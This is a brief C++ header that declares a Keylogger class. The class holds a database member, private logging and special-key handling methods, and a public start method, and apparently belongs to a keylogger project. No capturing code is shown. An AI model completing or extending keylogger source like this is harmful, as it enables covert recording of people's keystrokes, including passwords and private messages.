#pragma once
#include "database.h"

using namespace std;

class Keylogger
{
private:
    Database m_db;

    void LOG(std::string input);
    
    bool SpecialKeys(int S_Key);

public:
    void start(Database db);
};

